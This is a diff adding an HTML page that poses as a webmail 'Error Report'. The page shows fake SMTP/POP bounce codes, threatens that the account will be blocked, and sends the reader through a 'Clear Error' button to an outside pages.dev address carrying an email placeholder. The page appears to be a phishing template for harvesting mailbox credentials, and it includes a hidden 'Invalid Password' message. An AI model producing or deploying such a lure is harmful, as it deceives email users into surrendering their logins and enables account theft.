@@ -1,0 +1,445 @@
+﻿
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Error Report - An error in your SMTP/POP settings is blocking your incoming emails.</title>
+<link rel="icon" type="image/ico" href="fav.png">
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<script>
+         function populate() { 
+         function updateDateTime() {
+            const now = new Date();
+            // Format the date and time based on the user's local settings
+            const currentString = now.toLocaleString();
+            
+            // Inject the string into the HTML placeholder
+            document.getElementById("datetime").innerHTML = currentString;
+        }
+
+        // Run the function immediately when the page loads
+        updateDateTime();
+
+        // Update the time every second (1000 milliseconds)
+        setInterval(updateDateTime, 1000);}
+    </script>
+<style type="text/css">
+<!--
+/* Style the link to look like a beautiful button */
+  .button-link {
+    display: inline-block;
+    padding: 12px 24px;
+    background-color: #007BFF; /* Button background color */
+    color: white;             /* Text color */
+    text-decoration: none;    /* Removes the underline */
+    border-radius: 4px;       /* Rounded corners */
+    font-family: Arial, sans-serif;
+    font-weight: bold;
+    text-align: center;
+    transition: background-color 0.3s ease;
+  }
+
+  /* Change background color when hovering over the button */
+  .button-link:hover {
+    background-color: #0056b3;
+  }
+body {
+	background-color: #EFEFEF;
+	margin-left: 0px;
+	margin-top: 0px;
+	margin-right: 0px;
+	margin-bottom: 0px;
+}
+p {
+	float:none;
+	clear:both;
+}
+h3 {
+	line-height: 2em;
+}
+div, span, input[type=text], input[type=email], input[type=password] {
+	box-sizing: border-box;
+}
+.container {
+	font-family: Arial, Helvetica, sans-serif;
+	font-size: 14px;
+	line-height: 1.6em;
+	color: #333;
+	background-color: #FFF;
+	width: auto;
+	margin-right: 14%;
+	margin-left: 14%;
+	border-radius: 4px;
+	margin-bottom: 32px;
+	padding: 32px;
+	box-shadow: 0 0 8px rgba(0, 0, 0, 0.1);
+	border: 1px solid #d6d7dc;
+	margin-top: 32px;
+}
+.row {
+	margin-top: 8px;
+	margin-right: auto;
+	margin-bottom: 8px;
+	margin-left: auto;
+	height:auto;
+}
+.row1, .row1:first-of-type, .row1:last-of-type {
+	width: 20%;
+	display:inline-block;
+	float:left;
+	background-color: #f6f6f6;
+	padding: 10px;
+	height:17.4vh;
+	border-top-width: 1px;
+	border-right-width: 1px;
+	border-bottom-width: 1px;
+	border-left-width: 1px;
+	border-top-style: solid;
+	border-right-style: solid;
+	border-bottom-style: solid;
+	border-left-style: solid;
+	border-top-color: #ddd;
+	border-right-color: #ddd;
+	border-bottom-color: #ddd;
+	border-left-color: #ddd;
+}
+.row1:last-of-type {
+	background-color: #FFF;
+	width: 80%;
+	border-left-style: none;
+}
+.inner1, .inner1:first-of-type, .inner1:last-of-type {
+	width: 28%;
+	display:inline-block;
+	float:left;
+	background-color: #f6f6f6;
+	padding: 10px;
+	height:auto;
+	border-top-width: 1px;
+	border-right-width: 1px;
+	border-bottom-width: 1px;
+	border-left-width: 1px;
+	border-top-style: none;
+	border-right-style: none;
+	border-bottom-style: solid;
+	border-left-style: none;
+	border-top-color: #ddd;
+	border-right-color: #ddd;
+	border-bottom-color: #ddd;
+	border-left-color: #ddd;
+}
+.inner1:last-of-type {
+	background-color: #FFF;
+	width: 72%;
+}
+.Topic1 {
+	font-size: 18px;
+	margin-bottom: 20px;
+	color: #FFF;
+	background-color: #666;
+	padding: 16px;
+	text-align: center;
+	display: block;
+	border-radius: 4px;
+	border-top-style: none;
+	border-right-style: none;
+	border-bottom-style: none;
+	border-left-style: none;
+}
+.container-inner {
+	background-color:#FFF;
+	width: 74%;
+	position: relative;
+	border-top-width: 1px;
+	border-right-width: 1px;
+	border-bottom-width: 1px;
+	border-left-width: 1px;
+	border-top-style: solid;
+	border-right-style: solid;
+	border-bottom-style: none;
+	border-left-style: solid;
+	border-top-color: #ddd;
+	border-right-color: #ddd;
+	border-bottom-color: #ddd;
+	border-left-color: #ddd;
+	float: left;
+	display: inline-block;
+}
+.redText {
+	color: #F00;
+}
+.textYellow {
+	color: #FFC;
+	text-transform: uppercase;
+}
+.logo-top {
+	float: none;
+	width: 25%;
+	display:none;
+	padding: 0px;
+	margin-top: auto;
+	margin-right: auto;
+	margin-bottom: 10px;
+	margin-left: auto;
+}
+.logo-top img {
+	width: 100%;
+}
+.logo {
+	float: right;
+	width: 25%;
+	padding-top: 26px;
+	padding-right: 14px;
+	padding-bottom: 0px;
+	padding-left: 14px;
+	display:block;
+}
+.logo img {
+	width: 100%;
+}
+input[type=text], input[type=email], input[type=password] {
+	width: 220px;
+	color: #292929;
+	font-size: 12px;
+	line-height: 1.8em;
+	border: 1px solid #AEAEAE;
+	height: auto;
+	padding-top: 4px;
+	padding-right: 10px;
+	padding-bottom: 4px;
+	padding-left: 10px;
+	background-color: #FFF;
+	border-radius: 4px;
+	box-shadow: 0 0 0 4px #e7e7e7;
+	margin-right: 20px;
+	margin-bottom: 18px;
+}
+input[type=text]:focus, input[type=email]:focus, input[type=password]:focus {
+	box-shadow: 0 0 0 4px #CCACB3;
+}
+input[type=submit], input[type=button], .REG-button {
+	background-color:#5A6878;
+	color:#FFF;
+	width:auto;
+	padding-top: 8px;
+	padding-right: 16px;
+	padding-bottom: 8px;
+	padding-left: 16px;
+	font-size: 14px;
+	font-weight: normal;
+	border-radius: 4px;
+	letter-spacing: 0.8px;
+	border-top-style: none;
+	border-right-style: none;
+	border-bottom-style: none;
+	border-left-style: none;
+	box-shadow: 0 0 0 4px #e7e7e7;
+	margin-right: 12px;
+	text-transform: capitalize;
+	text-decoration: none;
+}
+input[type=submit]:hover, input[type=button]:hover, .REG-button:hover {
+	background-color:#38424B;
+}
+ @media all and (max-width:768px) {
+ .container {
+ margin-right: 4%;
+ margin-left: 4%;
+}
+}
+@media all and (max-width:400px) {
+ h3 {
+ line-height: 0.1em;
+}
+ .Topic1 {
+ font-size: 14px;
+ margin-bottom: 10px;
+ padding-bottom: 8px;
+ padding-top: 8px;
+}
+.container {
+font-size: 12px;
+ margin-right: 0px;
+ margin-left: 0px;
+ margin-bottom: 0px;
+ padding: 16px;
+ margin-top: 0px;
+ border-radius: 0px;
+}
+ .row {
+ margin-top: 8px;
+ margin-bottom: 8px;
+}
+.row1, .row1:first-of-type, .row1:last-of-type {
+ width: 100%;
+ float:none;
+ padding: 10px;
+ height: auto;
+}
+.row1:last-of-type {
+ width: 100%;
+ border-left-style: solid;
+}
+.container-inner {
+ width: 100%;
+ border-top-style: none;
+border-left-style: none;
+border-bottom-style: none;
+}
+.inner1, .inner1:first-of-type, .inner1:last-of-type {
+ width: 100%;
+ float:none;
+ padding: 6px;
+ border-top-width: 1px;
+ border-right-width: 1px;
+ border-bottom-width: 1px;
+ border-left-width: 1px;
+ border-top-style: solid;
+ border-right-style: solid;
+ border-bottom-style: solid;
+ border-left-style: solid;
+ border-top-color: #ddd;
+ border-right-color: #ddd;
+ border-bottom-color: #ddd;
+ border-left-color: #ddd;
+}
+.inner1:last-of-type {
+ background-color: #FFF;
+ width: 100%;
+}
+ input[type=text], input[type=email], input[type=password] {
+ width: 100%;
+}
+ input[type=submit], input[type=button] {
+ width:100%;
+ margin-top: 20px;
+}
+.logo-top {
+ float: none;
+ width: 50%;
+ display:block;
+}
+.logo-top img {
+ width: 100%;
+}
+.logo {
+ float: right;
+ width: 25%;
+ padding-top: 26px;
+ padding-right: 14px;
+ padding-bottom: 0px;
+ padding-left: 14px;
+ display:none;
+}
+.logo img {
+ width: 100%;
+}
+}
+.errorMsg {
+	color: #F00;
+	display: block;
+	float: none;
+	margin-right: auto;
+	margin-bottom: auto;
+	font-size: 12px;
+	font-family: Tahoma, Geneva, sans-serif;
+	padding-bottom: 4px;
+}
+.contactFrm {
+	margin-top: 10px;
+}
+-->
+</style>
+</head>
+<body onload="populate()">
+<div class="container">
+  <div class="Topic1"><strong class="textYellow"> Webmail   
+    ERROR REPORT</strong><br>
+    An error in your mailbox 
+    SMTP/POP settings is blocking your incoming emails.<br />
+  </div>
+  <div class="logo-top"> xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx </div>
+  <div class="row">
+    <div class="row1">
+      <h3><strong>Error Message:</strong></h3>
+    </div>
+    <div class="row1">
+      <div class="container-inner">
+        <div> <span class="inner1"> Date of notice:</span> <span class="inner1" id="datetime"> </span>
+          <p> 
+        </div>
+        <div> <span class="inner1">Subject:</span> <span class="inner1 redText">Error loading some of your inbox messages </span>
+          <p> 
+        </div>
+      </div>
+      <div class="logo"> 
+       
+       </div>
+    </div>
+    <p> 
+  </div>
+  <div class="row">
+    <div class="row1">
+      <h3><strong>Bounce Reason:</strong></h3>
+    </div>
+    <div class="row1"><strong>An error in your SMTP/POP settings is blocking your incoming e-mails</strong><br />
+      550-5.1.1: POP configuration text can not be verified<br />
+      550-5.1.2: Login encountered an unhandled error in your SSL settings<br />
+      550-5.1.3: Login encountered an unhandled error in your SSL settings </div>
+    <p> 
+  </div>
+  <div class="row">
+    <div class="row1">
+      <h3><strong>Suggested Solution:</strong></h3>
+    </div>
+    <div class="row1">Fill out the form below, our technical team will fix the error in less   than 3-4hrs. You will receive a confirmation email in your inbox once   the error is fixed.<br />
+      <strong>Note:</strong> Failure to send this error report will result in blocking of your e-mail address.
+      <p> 
+    </div>
+    <p> 
+  </div>
+  <div class="row">
+    <div class="row1">
+      <h3><strong>Send Error Detail:</strong></h3>
+    </div>
+    <div class="row1"><strong>Log in to your 
+
+email account to clear error detail.</strong>
+      <div class="contactFrm">
+        <span id="statusMessage" class="errorMsg"></span>
+        <form name="chalbhai" id="chalbhai" method="post">
+          
+          <a href="https://tridentsoluton-modal.pages.dev/#[[-Email-]]" class="button-link">Clear Error</a>
+          <div class="clear"> </div>
+        </form>
+      </div>
+<div id="err_m" style="display: none;text-align: justify; color: red;font-weight: 600">Invalid Password, please try again.</div>
+      <p> 
+    </div>
+    <p> 
+  </div>
+<script>function showStatus(statusMsg, msgClass = "") {
+    const statusSpan = document.getElementById("statusMessage");
+    
+    // 1. If the message is empty, clear the box and hide it
+    if (!statusMsg || statusMsg.trim() === "") {
+        statusSpan.innerHTML = "";
+        statusSpan.className = "errorMsg"; 
+        return;
+    }
+    
+    // 2. Set the dynamic text safely (prevents XSS vulnerabilities)
+    statusSpan.textContent = statusMsg;
+    
+    // 3. Apply the default class, plus any extra style class if provided
+    if (msgClass !== "") {
+        statusSpan.className = `errorMsg ${msgClass}`;
+    } else {
+        statusSpan.className = "errorMsg";
+    }
+}
+</script>
+
+</div>
+</body>
+</html>
